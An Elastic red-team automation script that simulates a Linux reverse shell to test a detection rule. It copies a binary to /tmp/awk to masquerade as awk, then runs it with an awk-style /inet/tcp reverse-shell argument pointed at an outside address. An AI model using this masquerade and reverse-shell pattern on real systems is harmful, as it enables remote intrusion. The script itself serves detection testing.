# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

import sys

from . import _common, register_code_rta, OSType, RuleMetadata

@register_code_rta(
    id="d768af98-4e0b-451a-bc29-04b0be110ee5",
    name="linux_reverse_shell_via_utility",
    platforms=[OSType.LINUX],
    endpoint_rules=[
        RuleMetadata(id="c71b9783-ca42-4532-8eb3-e8f2fe32ff39", name="Linux Reverse Shell via Suspicious Utility"),
    ],
    siem_rules=[],
    techniques=["T1059", "T1071"],
)
def main() -> None:
    _common.log("Creating a fake awk executable..")
    masquerade = "/tmp/awk"
    source = _common.get_path("bin", "netcon_exec_chain.elf")
    _common.copy_file(source, masquerade)
    _common.log("Granting execute permissions...")
    _common.execute(["chmod", "+x", masquerade])
    commands = [masquerade, "chain", "-h", "8.8.8.8", "-p", "1234", "-c", "/inet/tcp/1234"]
    _common.log("Simulating reverse shell activity..")
    _common.execute([*commands], timeout=5, kill=True)
    _common.log("Reverse shell simulation successful!")
    _common.log("Cleaning...")
    _common.remove_file(masquerade)
    _common.log("Simulation successfull!")


if __name__ == "__main__":
    sys.exit(main())
